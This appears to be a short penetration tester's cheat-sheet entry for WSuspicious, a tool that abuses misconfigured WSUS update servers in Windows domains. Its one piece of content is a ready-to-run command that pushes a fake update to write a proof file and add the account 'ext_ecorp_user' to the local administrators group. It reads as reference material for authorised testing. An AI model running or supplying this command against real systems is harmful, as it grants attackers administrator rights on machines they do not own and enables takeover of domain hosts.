# WSuspicious

## [[09.AD Misconfigurations/WSUS]] [[Misconfigurations/WSUS]]
1. Add user to Admin and drop file as confirmation:
    ```bash
    .\WSuspicious.exe /command:" -accepteula -s -d cmd /c ""echo eop_executed > C:\\eop_poc.txt; net localgroup Administratoren ext_ecorp_user /add""" /autoinstall
    ```

```meta
requirements: 
results: 
opsec: 
oss: #win
source: https://github.com/GoSecure/WSuspicious
description: WSUS exploitation tool
```